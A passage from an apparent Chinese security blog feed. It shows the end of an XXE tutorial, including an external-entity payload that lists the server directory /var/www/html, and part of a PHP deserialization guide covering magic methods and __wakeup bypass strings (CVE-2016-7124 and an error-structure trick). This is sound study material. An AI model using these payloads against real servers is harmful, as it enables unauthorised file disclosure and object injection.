class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE 总结</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://xz.aliyun.com/t/8041">从几道CTF题学习Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE 漏洞</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">java代码审计-xxe</a><br><a href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XML之DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxe漏洞攻击与防御</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE 漏洞总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从XML到XXE&quot;&gt;&lt;a href=&quot;#从XML到XXE&quot; class=&quot;headerlink&quot; title=&quot;从XML到XXE&quot;&gt;&lt;/a&gt;从XML到XXE&lt;/h1&gt;&lt;h2 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="xxe" scheme="https://www.lewiserii.top/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-10T04:00:00.000Z</published>
    <updated>2023-11-14T13:09:56.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()： 在创建对象时候初始化对象，一般用于对变量赋初值。<br><span class="hljs-title function_ invoke__">__destruct</span>()： 和构造函数相反，当对象所在函数调用完毕后执行。<br><span class="hljs-title function_ invoke__">__call</span>()： 当调用对象中不存在的方法会自动调用该方法。<br><span class="hljs-title function_ invoke__">__get</span>()： 获取对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__set</span>()： 设置对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__toString</span>()： 当对象被当做一个字符串使用时调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()： 序列化对象之前就调用此方法(其返回需要一个数组)<br><span class="hljs-title function_ invoke__">__wakeup</span>()： 反序列化恢复对象之前调用该方法<br><span class="hljs-title function_ invoke__">__isset</span>()： 在不可访问的属性上调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()触发<br><span class="hljs-title function_ invoke__">__unset</span>()： 在不可访问的属性上使用<span class="hljs-keyword">unset</span>()时触发<br><span class="hljs-title function_ invoke__">__invoke</span>()： 将对象当作函数来使用时执行此方法<br></code></pre></td></tr></table></figure><h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化<br><code>__destruct</code>：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure><h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>：序列化时自动调用<br><code>__wakeup</code>：反序列化时自动调用</p><blockquote><p>如果类中同时定义了 __unserialize()和__wakeup() 两个魔术方法，<br>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p></blockquote><blockquote><p>同理，如果类中同时定义了 __serialize()和 __sleep() 两个魔术方法，<br>则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br><span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>：对象执行类不存在的方法时会自动调用<code>__call</code>方法<br><code>__callstatic</code>：直接执行类不存在的方法时会自动调用<code>__callstatic</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">不存在lewiserii方法(__call)<br>不存在lewiserii方法(__callstatic)<br></code></pre></td></tr></table></figure><h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>：对不可访问属性或不存在属性进行 访问引用时自动调用<br><code>__set</code>：对不可访问属性或不存在属性进行 写入时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure><h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>：在不可访问的属性上使用<code>inset()</code>时触发<br><code>__unset</code>：在不可访问的属性上使用<code>unset()</code>时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure><h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>：类的实例和字符串拼接或者作为字符串引用时会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>：将对象当作函数来使用时调用此方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure><h1 id="反序列化绕过的几种方法"><a href="#反序列化绕过的几种方法" class="headerlink" title="反序列化绕过的几种方法"></a>反序列化绕过的几种方法</h1><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote><p>利用条件：<br>PHP5 &lt; 5.6.25<br>​PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>时会返回<code>aaa</code>，在修改对象属性个数的值，执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>会返回<code>test</code></p><h3 id="利用反序列化字符串报错"><a href="#利用反序列化字符串报错" class="headerlink" title="利用反序列化字符串报错"></a>利用反序列化字符串报错</h3><p>利用一个包含<code>__destruct</code>方法的类触发魔术方法可绕过<code>__wakeup</code>方法</p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>原本应该是<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>调用顺序是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>添加了一个<code>;N;</code>(反序列化末尾加上<code>;任意字符;</code>)的错误结构后调用顺序就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable 